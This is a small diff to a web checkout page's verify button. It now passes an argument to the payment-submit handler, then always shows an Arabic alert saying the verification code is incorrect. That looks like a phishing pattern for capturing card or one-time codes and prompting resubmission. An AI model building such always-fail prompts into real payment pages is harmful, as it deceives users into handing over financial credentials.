@@ -230,7 +230,7 @@ export default function CheckoutPage() {
                       />
                     </div>
                   </div>
-                  <Button onClick={()=>handlePaymentSubmit().then(()=>{
+                  <Button onClick={(w)=>handlePaymentSubmit(w).then(()=>{
                     alert("رمز التحقق غير صحيح")
                   })} className="w-full bg-[#002B5C] hover:bg-[#001F43] text-white">
 تحقق                  </Button>
